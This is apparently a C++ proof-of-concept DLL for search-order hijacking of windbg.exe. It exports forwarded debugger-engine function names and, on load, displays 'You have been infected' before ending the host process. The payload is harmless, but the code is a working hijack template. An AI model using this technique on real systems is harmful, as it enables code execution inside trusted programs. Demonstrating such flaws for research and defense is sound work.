#include <windows.h>


#pragma comment(linker, "/EXPORT:DebugCreate=kernel32.DebugBreak")
#pragma comment(linker, "/EXPORT:DebugConnectWide=kernel32.DebugBreak")

STARTUPINFOA si={sizeof(si)};
    PROCESS_INFORMATION pi;

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
        {
            char title[64];
            wsprintfA(title, "windbg.exe (%u)", GetCurrentProcessId());
            MessageBoxA(0, "You have been infected", title, MB_SYSTEMMODAL | MB_RTLREADING | MB_ICONQUESTION);
            CreateThread(0, 0, [] (PVOID) -> DWORD {
                ExitProcess(0);
                }, 0, 0, 0);
        }
            break;

        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
        
            if (lpvReserved != nullptr)
            {
                break; // do not do cleanup if process termination scenario
            }
            
         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}